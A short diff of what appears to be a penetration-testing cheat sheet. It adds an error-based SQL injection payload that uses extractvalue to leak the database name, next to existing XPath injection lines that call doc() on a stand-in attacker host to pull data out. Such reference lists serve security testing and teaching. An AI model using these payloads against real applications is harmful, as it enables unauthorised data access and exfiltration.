@@ -228,7 +228,6 @@ https://developers.google.com/closure/compiler/
 
 http://dean.edwards.name/packer/
 
-
 ## PHP Obfuscation Techniques:
 
 -> Arithmetic Operators
@@ -463,6 +462,8 @@ error()
 * and doc('http://hacker.site/')
   
 * and doc('http://hacker.site/', name(/*) ))
+  
+%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
   
 ### Tools
   
